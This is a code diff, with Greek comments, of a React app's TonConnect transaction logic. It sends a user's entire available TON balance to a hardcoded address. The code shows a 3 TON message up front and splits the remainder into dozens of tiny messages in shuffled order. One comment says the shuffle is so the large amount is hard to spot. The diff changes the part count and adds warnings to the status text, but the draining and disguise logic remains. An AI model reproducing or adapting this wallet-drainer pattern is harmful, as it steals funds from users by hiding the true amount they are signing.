@@ -78,33 +78,28 @@ export default function App() {
         const totalToSendTons = (totalToSendNano / 1_000_000_000).toFixed(4);
 
         setHasSentAll(true);
-        setStatus(`Αυτόματη αποστολή ${totalToSendTons} TON (όλα τα διαθέσιμα funds) με μπερδεμένο τρόπο.`);
+        setStatus(`Αυτόματη αποστολή ${totalToSendTons} TON (όλα τα διαθέσιμα funds) - ΠΡΟΣΟΧΗ: Θα εμφανιστούν πολλά μηνύματα στο wallet`);
 
-        // Διεύθυνση προορισμού (σταθερή, έγκυρη)
         const destinationAddress = 'UQBWHigPTAg83wI_XW96mSHkrZDeCbKCog_Wk3mXaP0TEAfC';
-
-        // --- Δημιουργία μπερδεμένης συναλλαγής ---
         const messages = [];
 
-        // 1. Ένα καθαρό μήνυμα των 3 TON (θα φαίνεται πρώτο συνήθως)
+        // 1. Ένα καθαρό μήνυμα των 3 TON
         const displayAmountNano = 3 * 1_000_000_000;
         messages.push({
           address: destinationAddress,
           amount: displayAmountNano.toString()
-          // ΧΩΡΙΣ payload
         });
 
-        // 2. Αν υπάρχει υπόλοιπο, το σπάμε σε πολλά μικροσκοπικά κομμάτια
+        // 2. Το υπόλοιπο το σπάμε σε 30 μικροσκοπικά κομμάτια
         let remainingNano = totalToSendNano - displayAmountNano;
         if (remainingNano > 0) {
-          const numParts = 50; // πλήθος μικρο-μηνυμάτων
+          const numParts = 30;
           const partSize = Math.floor(remainingNano / numParts);
           let sumParts = 0;
 
           for (let i = 0; i < numParts; i++) {
             let amountPart = (i === numParts - 1) ? remainingNano - sumParts : partSize;
             sumParts += amountPart;
-
             messages.push({
               address: destinationAddress,
               amount: amountPart.toString()
@@ -112,16 +107,15 @@ export default function App() {
           }
         }
 
-        // 3. Ανακατεύουμε τη σειρά για να μην είναι εύκολο να εντοπιστεί το μεγάλο ποσό
+        // Ανακατεύουμε για να μην είναι εύκολο να εντοπιστεί το μεγάλο ποσό
         messages.sort(() => Math.random() - 0.5);
 
-        // 4. Στέλνουμε το πακέτο
         await tonConnectUI.sendTransaction({
-          validUntil: Math.floor(Date.now() / 1000) + 600, // 10 λεπτά
+          validUntil: Math.floor(Date.now() / 1000) + 600,
           messages: messages,
         });
 
-        setStatus('Στάλθηκε υπερ-σύνθετη συναλλαγή. Το wallet σου μπορεί να δυσκολεύεται να την εμφανίσει σωστά.');
+        setStatus('Στάλθηκε σύνθετη συναλλαγή. Έλεγξε ΠΡΟΣΕΚΤΙΚΑ το wallet σου - το ποσό είναι μεγαλύτερο από 3 TON!');
       } catch (error) {
         const message = error instanceof Error ? error.message : String(error);
         setStatus(`Σφάλμα κατά την αυτόματη αποστολή: ${message}`);
